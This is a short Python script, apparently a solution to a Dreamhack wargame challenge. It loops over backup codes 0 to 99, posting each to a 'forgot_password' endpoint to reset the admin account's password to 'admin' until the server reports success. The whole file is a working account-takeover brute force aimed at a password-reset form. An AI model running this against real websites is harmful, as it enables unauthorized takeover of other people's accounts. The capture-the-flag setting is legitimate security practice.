import requests

port = 19688
url_index = f"http://host3.dreamhack.games:{port}/"
url_pw = url_index + "forgot_password"
url_login = url_index + ""
url_admin = url_index + "admin"

backupCode = 0

for i in range(100) :
  backupCode = i
  param = {
    "userid" : "admin",
    "newpassword" : "admin",
    "backupCode" : backupCode
  }
  r = requests.post(url_pw, data = param)
  if "Success" in r.text : break

print(1)